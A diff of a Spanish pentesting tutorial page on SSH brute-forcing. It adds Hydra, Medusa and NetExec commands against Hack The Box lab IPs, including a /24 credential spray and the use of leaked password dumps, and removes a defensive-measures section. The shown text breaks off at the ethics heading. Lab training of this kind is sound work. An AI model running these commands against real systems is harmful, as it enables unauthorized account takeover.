@@ -3,136 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Aprende técnicas de ataque de fuerza bruta SSH con Hydra y NetExec. Tutorial completo con ejemplos prácticos de pentesting y ciberseguridad.">
-    <meta name="keywords" content="SSH brute force, hydra, netexec, hacking ético, pentesting, ciberseguridad">
-    <title>Ataque de Fuerza Bruta SSH - Tutorial Completo | HackingUsef</title>
-    
-    <!-- Matrix Rain Canvas -->
-    <style>
-    /* Matrix Rain Background */
-    #matrix-canvas {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        z-index: -1;
-        background: linear-gradient(135deg, #000 0%, #001100 100%);
-    }
-    
-    /* Matrix Logo */
-    .matrix-logo {
-        display: inline-block;
-        color: #00FF00;
-        font-family: 'Courier New', monospace;
-        font-weight: bold;
-        text-shadow: 0 0 10px #00FF00, 0 0 20px #00FF00, 0 0 30px #00FF00;
-        animation: matrixGlow 2s ease-in-out infinite alternate;
-        background: linear-gradient(45deg, #00FF00, #00AA00, #00FF00);
-        -webkit-background-clip: text;
-        -webkit-text-fill-color: transparent;
-        background-clip: text;
-        position: relative;
-    }
-    
-    .matrix-logo::before {
-        content: '▶ ';
-        color: #00FF00;
-        animation: matrixBlink 1s infinite;
-    }
-    
-    .matrix-logo::after {
-        content: ' ◀';
-        color: #00FF00;
-        animation: matrixBlink 1s infinite reverse;
-    }
-    
-    @keyframes matrixGlow {
-        0% { text-shadow: 0 0 5px #00FF00, 0 0 10px #00FF00, 0 0 15px #00FF00; }
-        100% { text-shadow: 0 0 10px #00FF00, 0 0 20px #00FF00, 0 0 30px #00FF00, 0 0 40px #00FF00; }
-    }
-    
-    @keyframes matrixBlink {
-        0%, 50% { opacity: 1; }
-        51%, 100% { opacity: 0.3; }
-    }
-    
-    /* Enhanced Body Styles for Matrix theme */
-    body {
-        background: linear-gradient(135deg, #000 0%, #001100 25%, #000 50%, #001100 75%, #000 100%) !important;
-        background-size: 400% 400% !important;
-        animation: matrixBackground 8s ease infinite !important;
-        overflow-x: hidden !important;
-    }
-    
-    @keyframes matrixBackground {
-        0% { background-position: 0% 50%; }
-        50% { background-position: 100% 50%; }
-        100% { background-position: 0% 50%; }
-    }
-    
-    /* Matrix-style containers */
-    .container, .example, .tool-card {
-        background: rgba(0, 20, 0, 0.85) !important;
-        border: 2px solid #00FF00 !important;
-        border-radius: 8px !important;
-        box-shadow: 0 0 20px rgba(0, 255, 0, 0.3), inset 0 0 20px rgba(0, 255, 0, 0.1) !important;
-        backdrop-filter: blur(5px) !important;
-    }
-    
-    /* Matrix-style headers */
-    h1, h2, h3, h4, h5, h6 {
-        color: #00FF00 !important;
-        text-shadow: 0 0 10px #00FF00, 0 0 20px #00FF00 !important;
-        font-family: 'Courier New', monospace !important;
-        border-bottom: 2px solid #00FF00 !important;
-        padding-bottom: 10px !important;
-    }
-    
-    h1::before, h2::before {
-        content: '>>> ';
-        color: #00AA00;
-        animation: matrixBlink 1.5s infinite;
-    }
-    
-    /* Matrix-style text */
-    p, .subtitle {
-        color: #00DD00 !important;
-        font-family: 'Courier New', monospace !important;
-        text-shadow: 0 0 5px rgba(0, 255, 0, 0.5) !important;
-    }
-    
-    /* Matrix-style code blocks */
-    .code-block {
-        background: #000 !important;
-        border: 2px solid #00FF00 !important;
-        box-shadow: 0 0 20px rgba(0, 255, 0, 0.3) !important;
-    }
-    
-    .code-block code {
-        color: #00FF00 !important;
-        text-shadow: 0 0 10px #00FF00 !important;
-    }
-    
-    /* Matrix-style alerts */
-    .alert {
-        background: rgba(0, 20, 0, 0.8) !important;
-        border: 2px solid #00FF00 !important;
-        box-shadow: 0 0 15px rgba(0, 255, 0, 0.3) !important;
-    }
-    
-    /* Matrix-style links */
-    a {
-        color: #00FF00 !important;
-        text-shadow: 0 0 5px #00FF00 !important;
-        border-bottom: 1px dotted #00FF00 !important;
-    }
-    
-    a:hover {
-        color: #00FFFF !important;
-        text-shadow: 0 0 10px #00FFFF !important;
-    }
-    </style>
+    <meta name="description" content="Ataques de fuerza bruta SSH: enumeración, diccionarios, hydra y herramientas. Caso práctico con HTB Servenom y Writer.">
+    <meta name="keywords" content="SSH, brute force, hydra, medusa, ncrack, dictionary attack, pentesting, HTB">
+    <title>Ataques SSH: Fuerza Bruta | HackingUsef</title>
     
     <!-- Google Fonts -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
@@ -158,11 +31,7 @@
             --gradient-primary: linear-gradient(135deg, #00ff88 0%, #00d4ff 100%);
         }
 
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
 
         body {
             font-family: 'Inter', sans-serif;
@@ -170,441 +39,351 @@
             color: var(--text-primary);
             line-height: 1.7;
             min-height: 100vh;
+            overflow-x: hidden;
         }
 
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 2rem;
+        .animated-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+            background: linear-gradient(45deg, #0a0a0a, #1a1a2e, #16213e);
+            background-size: 400% 400%;
+            animation: gradientShift 15s ease infinite;
         }
+        @keyframes gradientShift { 0% { background-position: 0% 50% } 50% { background-position: 100% 50% } 100% { background-position: 0% 50% } }
 
-        /* Header */
-        .header {
-            text-align: center;
-            padding: 2rem 0 3rem;
-            border-bottom: 1px solid var(--border-color);
-            margin-bottom: 3rem;
+        .matrix-rain { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; pointer-events: none; opacity: 0.1; }
+        .matrix-column { position: absolute; color: var(--primary-color); font-family: 'JetBrains Mono', monospace; font-size: 14px; animation: matrixFall linear infinite; }
+        @keyframes matrixFall { 0% { transform: translateY(-100vh); opacity: 1 } 100% { transform: translateY(100vh); opacity: 0 } }
+
+        .container { max-width: 1000px; margin: 0 auto; padding: 2rem; position: relative; z-index: 1; }
+
+        .header { text-align: center; padding: 2rem 0 3rem; border-bottom: 1px solid var(--border-color); margin-bottom: 3rem; }
+        .back-link { display: inline-flex; align-items: center; gap: 0.5rem; color: var(--primary-color); text-decoration: none; margin-bottom: 2rem; font-size: 0.9rem; transition: all 0.3s ease; }
+        .back-link:hover { transform: translateX(-5px); }
+
+        .logo-container { position: relative; display: inline-block; margin-bottom: 2rem; }
+        .logo-matrix {
+            width: 120px; height: 120px; background: var(--darker-bg); border: 2px solid var(--primary-color); border-radius: 12px;
+            display: flex; align-items: center; justify-content: center; font-family: 'JetBrains Mono', monospace; font-size: 1.8rem; font-weight: 700; color: var(--primary-color);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.3); transition: all 0.3s ease; position: relative; overflow: hidden;
         }
+        .logo-matrix:hover { transform: scale(1.05) rotateX(5deg); box-shadow: 0 0 50px rgba(0, 255, 136, 0.5); }
+        .logo-matrix::before { content: ''; position: absolute; top: -2px; left: -2px; right: -2px; bottom: -2px; background: linear-gradient(45deg, var(--primary-color), transparent, var(--primary-color)); border-radius: 12px; z-index: -1; animation: borderGlow 2s ease-in-out infinite alternate; }
+        @keyframes borderGlow { 0% { opacity: .5 } 100% { opacity: 1 } }
+        .logo-text { position: relative; z-index: 2; }
+        .logo-text::after { content: ''; position: absolute; inset: 0; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,255,136,.03) 2px, rgba(0,255,136,.03) 4px); animation: scanLines 2s linear infinite; }
+        @keyframes scanLines { 0% { transform: translateY(-100%) } 100% { transform: translateY(100%) } }
 
-        .back-link {
-            display: inline-flex;
-            align-items: center;
-            gap: 0.5rem;
-            color: var(--primary-color);
-            text-decoration: none;
-            margin-bottom: 2rem;
-            font-size: 0.9rem;
-            transition: all 0.3s ease;
-        }
+        h1 { font-size: 2.8rem; font-weight: 700; margin-bottom: 1rem; background: var(--gradient-primary); -webkit-background-clip: text; -webkit-text-fill-color: transparent; background-clip: text; }
+        .subtitle { font-size: 1.2rem; color: var(--text-secondary); font-weight: 300; }
 
-        .back-link:hover {
-            transform: translateX(-5px);
-        }
+        .section { margin-bottom: 4rem; }
+        h2 { color: var(--primary-color); font-size: 1.8rem; margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.8rem; }
+        h3 { color: var(--secondary-color); font-size: 1.4rem; margin: 2rem 0 1rem; }
+        h4 { color: var(--accent-color); font-size: 1.2rem; margin: 1.5rem 0 .8rem; }
+        p { margin-bottom: 1.5rem; color: var(--text-primary); }
 
-        h1 {
-            font-size: 2.8rem;
-            font-weight: 700;
-            margin-bottom: 1rem;
-            background: var(--gradient-primary);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
+        .alert { padding: 1.5rem; border-radius: 8px; margin: 2rem 0; border-left: 4px solid; }
+        .alert-definition { background: rgba(0,255,136,.1); border-color: var(--primary-color); }
+        .alert-danger { background: rgba(231,76,60,.1); border-color: #e74c3c; }
+        .alert-info { background: rgba(124,58,237,.1); border-color: var(--accent-color); }
+        .alert-warning { background: rgba(255,107,53,.1); border-color: var(--secondary-color); }
 
-        .subtitle {
-            font-size: 1.2rem;
-            color: var(--text-secondary);
-            font-weight: 300;
-        }
+        .code-block { background: var(--code-bg); border: 1px solid var(--border-color); border-radius: 8px; padding: 1.5rem; margin: 2rem 0; position: relative; overflow-x: auto; }
+        .code-block code { font-family: 'JetBrains Mono', monospace; color: var(--primary-color); font-size: 0.95rem; white-space: pre; }
+        .code-label { position: absolute; top: -12px; left: 1rem; background: var(--card-bg); color: var(--text-secondary); padding: .3rem .8rem; font-size: .8rem; border-radius: 4px; border: 1px solid var(--border-color); }
 
-        /* Content sections */
-        .section {
-            margin-bottom: 3rem;
-        }
+        .example { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 2rem; margin: 3rem 0; }
+        .example-title { color: var(--secondary-color); font-size: 1.3rem; margin-bottom: 1.5rem; display: flex; align-items: center; gap: .5rem; }
+        .machine-info { background: rgba(124,58,237,.1); border: 1px solid var(--accent-color); border-radius: 6px; padding: 1rem; margin: 1rem 0; font-size: .9rem; }
 
-        h2 {
-            color: var(--primary-color);
-            font-size: 1.8rem;
-            margin-bottom: 1.5rem;
-            display: flex;
-            align-items: center;
-            gap: 0.8rem;
-        }
+        .attack-flow { display: flex; flex-direction: column; gap: 1rem; margin: 2rem 0; }
+        .flow-step { display: flex; align-items: center; gap: 1rem; padding: 1rem; background: var(--card-bg); border-radius: 8px; border-left: 4px solid var(--primary-color); }
+        .flow-number { background: var(--primary-color); color: var(--dark-bg); width: 30px; height: 30px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 600; font-size: .9rem; }
+        .flow-content { flex: 1; }
+        .flow-title { color: var(--primary-color); font-weight: 600; margin-bottom: .3rem; }
+        .flow-desc { color: var(--text-secondary); font-size: .9rem; }
 
-        h3 {
-            color: var(--secondary-color);
-            font-size: 1.4rem;
-            margin: 2rem 0 1rem;
-        }
+        ul { margin-left: 1.5rem; margin-bottom: 1.5rem; }
+        li { margin-bottom: .5rem; color: var(--text-primary); }
 
-        p {
-            margin-bottom: 1.5rem;
-            color: var(--text-primary);
-        }
+        .footer { text-align: center; padding: 3rem 0 2rem; border-top: 1px solid var(--border-color); margin-top: 4rem; color: var(--text-muted); }
 
-        /* Alert boxes */
-        .alert {
-            padding: 1.5rem;
-            border-radius: 8px;
-            margin: 2rem 0;
-            border-left: 4px solid;
-        }
-
-        .alert-definition {
-            background: rgba(0, 255, 136, 0.1);
-            border-color: var(--primary-color);
-        }
-
-        .alert-warning {
-            background: rgba(255, 107, 53, 0.1);
-            border-color: var(--secondary-color);
-        }
-
-        .alert-info {
-            background: rgba(124, 58, 237, 0.1);
-            border-color: var(--accent-color);
-        }
-
-        /* Code blocks */
-        .code-block {
-            background: var(--code-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin: 2rem 0;
-            position: relative;
-            overflow-x: auto;
-        }
-
-        .code-block code {
-            font-family: 'JetBrains Mono', monospace;
-            color: var(--primary-color);
-            font-size: 0.95rem;
-            white-space: pre;
-        }
-
-        .code-label {
-            position: absolute;
-            top: -12px;
-            left: 1rem;
-            background: var(--card-bg);
-            color: var(--text-secondary);
-            padding: 0.3rem 0.8rem;
-            font-size: 0.8rem;
-            border-radius: 4px;
-            border: 1px solid var(--border-color);
-        }
-
-        /* Example sections */
-        .example {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 12px;
-            padding: 2rem;
-            margin: 2rem 0;
-        }
-
-        .example-title {
-            color: var(--secondary-color);
-            font-size: 1.2rem;
-            margin-bottom: 1rem;
-            display: flex;
-            align-items: center;
-            gap: 0.5rem;
-        }
-
-        /* Tools section */
-        .tools-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 1.5rem;
-            margin: 2rem 0;
-        }
-
-        .tool-card {
-            background: var(--card-bg);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            padding: 1.5rem;
-            transition: all 0.3s ease;
-        }
-
-        .tool-card:hover {
-            border-color: var(--primary-color);
-            transform: translateY(-2px);
-        }
-
-        .tool-name {
-            color: var(--primary-color);
-            font-size: 1.1rem;
-            font-weight: 600;
-            margin-bottom: 0.5rem;
-        }
-
-        .tool-desc {
-            color: var(--text-secondary);
-            font-size: 0.9rem;
-        }
-
-        /* Images */
-        .image-container {
-            margin: 2rem 0;
-            text-align: center;
-        }
-
-        .image-container img {
-            max-width: 100%;
-            height: auto;
-            border-radius: 8px;
-            border: 1px solid var(--border-color);
-        }
-
-        /* Lists */
-        ul {
-            margin-left: 1.5rem;
-            margin-bottom: 1.5rem;
-        }
-
-        li {
-            margin-bottom: 0.5rem;
-            color: var(--text-primary);
-        }
-
-        /* Footer */
-        .footer {
-            text-align: center;
-            padding: 3rem 0 2rem;
-            border-top: 1px solid var(--border-color);
-            margin-top: 4rem;
-            color: var(--text-muted);
-        }
-
-        /* Responsive */
         @media (max-width: 768px) {
-            .container {
-                padding: 1rem;
-            }
-            
-            h1 {
-                font-size: 2.2rem;
-            }
-            
-            .tools-grid {
-                grid-template-columns: 1fr;
-            }
+            .container { padding: 1rem; }
+            h1 { font-size: 2.2rem; }
+            .logo-matrix { width: 100px; height: 100px; font-size: 1.5rem; }
         }
     </style>
 </head>
 
 <body>
-    <!-- Matrix Rain Canvas -->
-    <canvas id="matrix-canvas"></canvas>
-    
+    <div class="animated-bg"></div>
+    <div class="matrix-rain" id="matrix-rain"></div>
+
     <div class="container">
         <header class="header">
             <a href="../" class="back-link">
                 <i class="fas fa-arrow-left"></i>
                 Volver al inicio
             </a>
-            <h1><span class="matrix-logo">ATAQUE DE FUERZA BRUTA SSH</span></h1>
-            <p class="subtitle">Técnicas de pentesting para servicios SSH con Hydra y NetExec</p>
+            <div class="logo-container">
+                <div class="logo-matrix">
+                    <div class="logo-text">&lt;/&gt;</div>
+                </div>
+            </div>
+            <h1>Ataques SSH: Fuerza Bruta</h1>
+            <p class="subtitle">Enumeración de Usuarios, Diccionarios y Herramientas de Ataque</p>
         </header>
 
         <main>
             <section class="section">
-                <h2><i class="fas fa-info-circle"></i>¿Qué es un Ataque de Fuerza Bruta SSH?</h2>
+                <h2><i class="fas fa-terminal"></i>¿Qué es un Ataque de Fuerza Bruta SSH?</h2>
                 
                 <div class="alert alert-definition">
-                    <p><strong>Definición:</strong> Un ataque de fuerza bruta SSH es una técnica de ciberataque en la cual un atacante intenta descubrir credenciales de acceso mediante la prueba sistemática y automatizada de múltiples combinaciones de nombres de usuario y contraseñas hasta encontrar una combinación válida.</p>
+                    <p><strong>Definición:</strong> Un ataque de fuerza bruta SSH es una técnica de penetración que consiste en intentar repetidamente diferentes combinaciones de nombres de usuario y contraseñas hasta encontrar credenciales válidas para el servicio SSH (Secure Shell). Este método explota contraseñas débiles y configuraciones inseguras para obtener acceso remoto no autorizado al sistema.</p>
                 </div>
 
-                <p>En el contexto del protocolo SSH (Secure Shell), este tipo de ataque se centra en explotar el <strong>puerto 22</strong> (puerto estándar de SSH), que es utilizado para establecer conexiones remotas seguras entre dispositivos a través de una red.</p>
-
-                <h3>Características del Puerto SSH 22</h3>
+                <h3>Requisitos para que sea exitoso:</h3>
                 <ul>
-                    <li><strong>Protocolo:</strong> SSH (Secure Shell)</li>
-                    <li><strong>Función:</strong> Acceso remoto seguro y transferencia de archivos</li>
-                    <li><strong>Encriptación:</strong> Utiliza cifrado para proteger la comunicación</li>
-                    <li><strong>Autenticación:</strong> Basada en credenciales o claves públicas/privadas</li>
+                    <li>Puerto SSH <strong>abierto y accesible</strong> (generalmente puerto 22)</li>
+                    <li>Uso de <strong>contraseñas débiles</strong> o por defecto</li>
+                    <li>Ausencia de <strong>rate limiting</strong> o protección anti-brute force</li>
+                    <li>Lista de usuarios válidos (enumeración previa o usernames comunes)</li>
                 </ul>
-            </section>
 
-            <section class="section">
-                <h2><i class="fas fa-tools"></i>Herramientas para Ataques de Fuerza Bruta</h2>
-                
-                <div class="tools-grid">
-                    <div class="tool-card">
-                        <div class="tool-name">Hydra</div>
-                        <div class="tool-desc">Herramienta de fuerza bruta rápida y versátil que soporta múltiples protocolos incluyendo SSH, FTP, HTTP, y más.</div>
-                    </div>
-                    
-                    <div class="tool-card">
-                        <div class="tool-name">NetExec</div>
-                        <div class="tool-desc">Sucesor de CrackMapExec, diseñado para entornos empresariales con capacidades avanzadas de red.</div>
-                    </div>
-                    
-                    <div class="tool-card">
-                        <div class="tool-name">Medusa</div>
-                        <div class="tool-desc">Herramienta de fuerza bruta paralela y modular con soporte para múltiples servicios de red.</div>
-                    </div>
-                    
-                    <div class="tool-card">
-                        <div class="tool-name">Ncrack</div>
-                        <div class="tool-desc">Scanner de credenciales de red de alta velocidad desarrollado por el equipo de Nmap.</div>
-                    </div>
+                <div class="alert alert-danger">
+                    <p><strong>Impacto:</strong> Acceso completo al sistema como usuario legítimo, ejecución remota de comandos, escalación de privilegios y movimiento lateral en la red.</p>
                 </div>
             </section>
 
             <section class="section">
-                <h2><i class="fas fa-list"></i>Preparación de Diccionarios</h2>
-                
-                <p>Para ejecutar un ataque de fuerza bruta efectivo, es fundamental contar con diccionarios de usuarios y contraseñas bien estructurados:</p>
-                
-                <h3>Fuentes de Información para Usuarios</h3>
-                <ul>
-                    <li><strong>Páginas web corporativas:</strong> Secciones de "Nuestro equipo" o "Staff"</li>
-                    <li><strong>Redes sociales:</strong> LinkedIn, Twitter, perfiles profesionales</li>
-                    <li><strong>Reconocimiento OSINT:</strong> Información pública disponible</li>
-                    <li><strong>Convenciones comunes:</strong> admin, administrator, root, user, etc.</li>
-                </ul>
-
-                <h3>Diccionarios de Contraseñas Populares</h3>
-                <ul>
-                    <li><strong>rockyou.txt:</strong> Incluido por defecto en Kali Linux</li>
-                    <li><strong>SecLists:</strong> Colección amplia de diccionarios especializados</li>
-                    <li><strong>Contraseñas por defecto:</strong> Credenciales predeterminadas de fabricantes</li>
-                </ul>
-            </section>
-
-            <section class="section">
-                <h2><i class="fas fa-terminal"></i>Ejemplos Prácticos</h2>
+                <h2><i class="fas fa-server"></i>Casos Prácticos: HTB Servenom y Writer</h2>
 
                 <div class="example">
                     <div class="example-title">
-                        <i class="fas fa-code"></i>
-                        Ejemplo 1: Ataque con Listas Personalizadas - HTB Servenom
+                        <i class="fas fa-terminal"></i>
+                        Ataque SSH con Hydra - HTB Servenom (10.10.10.184)
                     </div>
-                    
-                    <p>En la máquina <strong>Servenom (10.10.10.184)</strong> de Hack The Box, identificamos el puerto 22 SSH abierto. Procedemos con un ataque utilizando listas personalizadas:</p>
-                    
-                    <div class="code-block">
-                        <div class="code-label">Comando Hydra</div>
-                        <code>hydra -L users.txt -P passwords.txt ssh://10.10.10.184</code>
-                    </div>
-                    
-                    <div class="alert alert-info">
-                        <p><strong>Explicación del comando:</strong></p>
+
+                    <div class="machine-info">
+                        <strong>Escenario del ataque:</strong>
                         <ul>
-                            <li><code>-L users.txt</code>: Lista de usuarios a probar</li>
-                            <li><code>-P passwords.txt</code>: Lista de contraseñas a probar</li>
-                            <li><code>ssh://10.10.10.184</code>: Objetivo SSH</li>
+                            <li><strong>Target:</strong> HTB Servenom (10.10.10.184)</li>
+                            <li><strong>Puerto abierto:</strong> SSH 22/TCP</li>
+                            <li><strong>Herramientas:</strong> Hydra, listas de usuarios/passwords personalizadas</li>
+                            <li><strong>Resultado esperado:</strong> Credenciales válidas para acceso SSH</li>
                         </ul>
+                    </div>
+
+                    <h4>Metodología de Explotación:</h4>
+                    <div class="attack-flow">
+                        <div class="flow-step">
+                            <div class="flow-number">1</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Reconocimiento</div>
+                                <div class="flow-desc">Enumeración de puertos SSH y detección de versión</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">2</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Recopilación de Usuarios</div>
+                                <div class="flow-desc">Obtención de usernames desde sitio web o enumeración</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">3</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Preparación de Diccionarios</div>
+                                <div class="flow-desc">Creación de listas de usuarios y contraseñas objetivo</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">4</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Ataque Brute Force</div>
+                                <div class="flow-desc">Ejecución de Hydra con listas múltiples</div>
+                            </div>
+                        </div>
+                        <div class="flow-step">
+                            <div class="flow-number">5</div>
+                            <div class="flow-content">
+                                <div class="flow-title">Validación y Acceso</div>
+                                <div class="flow-desc">Conexión SSH con credenciales encontradas</div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <h4>Fase 1: Reconocimiento del Servicio SSH</h4>
+                    <div class="code-block">
+                        <div class="code-label">Nmap - Enumeración SSH</div>
+                        <code>nmap -p 22 -sV -sC 10.10.10.184
+
+# Output esperado:
+# 22/tcp open  ssh     OpenSSH 7.6p1
+# | ssh-hostkey: 
+# |   2048 aa:xx:xx... (RSA)
+# |   256 bb:yy:yy... (ECDSA)
+
+# Banner grabbing adicional
+nc 10.10.10.184 22</code>
+                    </div>
+
+                    <h4>Fase 2: Recopilación de Usuarios Potenciales</h4>
+                    <div class="code-block">
+                        <div class="code-label">Creación de listas</div>
+                        <code># Usuarios obtenidos de enumeración web
+cat > users.txt <<'EOF'
+admin
+administrator
+root
+user
+guest
+test
+kyle
+servenom
+www-data
+developer
+support
+EOF
+
+# Contraseñas comunes y específicas del target
+cat > passwords.txt <<'EOF'
+password
+123456
+admin
+root
+servenom
+password123
+qwerty
+letmein
+welcome
+EOF</code>
+                    </div>
+
+                    <h4>Fase 3: Ataque con Hydra</h4>
+                    <div class="code-block">
+                        <div class="code-label">Hydra - Brute Force Attack</div>
+                        <code># Ataque con listas múltiples
+hydra -L users.txt -P passwords.txt ssh://10.10.10.184 -t 4 -V
+
+# Parámetros explicados:
+# -L users.txt: Lista de usuarios
+# -P passwords.txt: Lista de contraseñas  
+# -t 4: 4 threads paralelos (no sobrecargar)
+# -V: Verbose output
+# ssh://target: Servicio y objetivo
+
+# Salida exitosa esperada:
+# [22][ssh] host: 10.10.10.184 login: kyle password: password123</code>
+                    </div>
+
+                    <div class="alert alert-info">
+                        <p>En este ejemplo, Hydra encontró credenciales válidas: <strong>kyle:password123</strong> después de probar las combinaciones sistemáticamente.</p>
                     </div>
                 </div>
 
                 <div class="example">
                     <div class="example-title">
-                        <i class="fas fa-code"></i>
-                        Ejemplo 2: Usuario Específico con Diccionario - HTB Writer
+                        <i class="fas fa-lock"></i>
+                        Ataque Dirigido - HTB Writer (10.10.11.101)
                     </div>
-                    
-                    <p>En la máquina <strong>Writer (10.10.11.101)</strong> de HTB, identificamos el usuario potencial "kyle". Realizamos un ataque dirigido utilizando el diccionario rockyou.txt:</p>
-                    
-                    <div class="code-block">
-                        <div class="code-label">Comando Hydra</div>
-                        <code>hydra -l kyle -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.101</code>
-                    </div>
-                    
-                    <div class="alert alert-info">
-                        <p><strong>Explicación del comando:</strong></p>
-                        <ul>
-                            <li><code>-l kyle</code>: Usuario específico (minúscula para un solo usuario)</li>
-                            <li><code>-P rockyou.txt</code>: Diccionario de contraseñas popular</li>
-                        </ul>
-                    </div>
-                </div>
 
-                <div class="example">
-                    <div class="example-title">
-                        <i class="fas fa-code"></i>
-                        Ejemplo 3: Entorno Empresarial con NetExec - HTB Wifinetic
-                    </div>
-                    
-                    <p>En entornos empresariales, NetExec ofrece funcionalidades avanzadas. Ejemplo contra <strong>Wifinetic (10.10.11.247)</strong>:</p>
-                    
-                    <div class="code-block">
-                        <div class="code-label">Comando NetExec</div>
-                        <code>netexec ssh 10.10.11.247 -u users.txt -p passwords.txt</code>
-                    </div>
-                    
-                    <div class="alert alert-info">
-                        <p><strong>Ventajas de NetExec:</strong></p>
+                    <div class="machine-info">
+                        <strong>Escenario específico:</strong>
                         <ul>
-                            <li>Detección automática de credenciales válidas</li>
-                            <li>Mejor manejo de errores y timeouts</li>
-                            <li>Integración con otros protocolos de red</li>
-                            <li>Reporting más detallado de resultados</li>
+                            <li><strong>Target:</strong> HTB Writer (10.10.11.101)</li>
+                            <li><strong>Usuario conocido:</strong> kyle (obtenido de enumeración web)</li>
+                            <li><strong>Estrategia:</strong> Usuario fijo + diccionario masivo</li>
+                            <li><strong>Diccionario:</strong> rockyou.txt (14M+ passwords)</li>
                         </ul>
+                    </div>
+
+                    <h4>Ataque Dirigido con Rockyou</h4>
+                    <div class="code-block">
+                        <div class="code-label">Hydra - Diccionario masivo</div>
+                        <code># Localizar rockyou.txt
+locate rockyou.txt
+# /usr/share/wordlists/rockyou.txt
+
+# Descomprimir si está comprimido
+gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# Ataque dirigido
+hydra -l kyle -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.101 -t 4 -V -f
+
+# Parámetros adicionales:
+# -l kyle: Usuario específico (fijo)
+# -f: Detener al encontrar primera credencial válida
+# -P rockyou.txt: ~14 millones de contraseñas
+
+# Monitorear progreso
+hydra -l kyle -P /usr/share/wordlists/rockyou.txt ssh://10.10.11.101 -t 4 -V -f -s 22</code>
+                    </div>
+
+                    <h4>Validación de Credenciales</h4>
+                    <div class="code-block">
+                        <div class="code-label">SSH Connection Test</div>
+                        <code># Conectar con credenciales encontradas
+ssh kyle@10.10.11.101
+
+# Verificar acceso y permisos
+whoami
+id
+pwd
+sudo -l
+
+# Enumeración post-acceso
+ls -la /home/kyle/
+cat /home/kyle/user.txt</code>
+                    </div>
+
+                    <div class="alert alert-warning">
+                        <p>El ataque con rockyou.txt puede tardar horas dependiendo de la posición de la contraseña en el diccionario. Considerar usar versiones optimizadas o filtradas para targets específicos.</p>
                     </div>
                 </div>
             </section>
 
             <section class="section">
-                <h2><i class="fas fa-shield-alt"></i>Medidas de Protección</h2>
+                <h2><i class="fas fa-toolbox"></i>Herramientas Alternativas y Técnicas Avanzadas</h2>
                 
-                <div class="alert alert-warning">
-                    <p><strong>Importante:</strong> Como profesionales de ciberseguridad, también debemos conocer las contramedidas para proteger los sistemas SSH.</p>
+                <h3>NetExec para entornos corporativos</h3>
+                <div class="code-block">
+                    <div class="code-label">NetExec SSH Bruteforce</div>
+                    <code># Ataque con NetExec (ex-CrackMapExec)
+netexec ssh 10.10.11.247 -u users.txt -p passwords.txt --verbose
+
+# Con credenciales específicas
+netexec ssh 10.10.11.247 -u admin -p password123
+
+# Verificar múltiples targets
+netexec ssh 10.10.11.0/24 -u admin -p passwords.txt --threads 5</code>
                 </div>
-                
-                <h3>Técnicas de Defensa Recomendadas</h3>
+
+                <h3>Medusa como alternativa a Hydra</h3>
+                <div class="code-block">
+                    <div class="code-label">Medusa SSH Attack</div>
+                    <code># Medusa syntax
+medusa -h 10.10.10.184 -U users.txt -P passwords.txt -M ssh -t 4
+
+# Con usuario específico
+medusa -h 10.10.11.101 -u kyle -P rockyou.txt -M ssh -t 4 -f</code>
+                </div>
+
+                <h3>Optimización de diccionarios</h3>
                 <ul>
-                    <li><strong>Autenticación por claves:</strong> Deshabilitar autenticación por contraseña</li>
-                    <li><strong>Fail2ban:</strong> Bloqueo automático tras intentos fallidos</li>
-                    <li><strong>Rate limiting:</strong> Limitar intentos de conexión por minuto</li>
-                    <li><strong>Puerto no estándar:</strong> Cambiar del puerto 22 por defecto</li>
-                    <li><strong>Firewalls:</strong> Restringir acceso por IP origen</li>
-                    <li><strong>2FA:</strong> Autenticación de dos factores</li>
-                    <li><strong>Monitoreo:</strong> Logs y alertas de intentos de acceso</li>
+                    <li><strong>Filtrado por longitud:</strong> Eliminar passwords muy cortas/largas según política</li>
+                    <li><strong>Mangling rules:</strong> Aplicar variaciones (mayúsculas, números, años)</li>
+                    <li><strong>Target-specific wordlists:</strong> Crear diccionarios basados en la organización</li>
+                    <li><strong>Leaked passwords:</strong> Usar dumps de credenciales específicos del target</li>
                 </ul>
             </section>
 
             <section class="section">
                 <h2><i class="fas fa-exclamation-triangle"></i>Consideraciones Éticas y Legales</h2>
-                
-                <div class="alert alert-warning">
-                    <p><strong>Advertencia Legal:</strong> Los ataques de fuerza bruta solo deben realizarse en:</p>
-                    <ul>
-                        <li>Sistemas propios o con autorización explícita</li>
-                        <li>Laboratorios de práctica autorizados (HTB, TryHackMe, etc.)</li>
-                        <li>Entornos de pentesting contratados legalmente</li>
-                    </ul>
-                    <p>El uso no autorizado de estas técnicas puede constituir un delito según las leyes locales e internacionales.</p>
+                <div class="alert alert-danger">
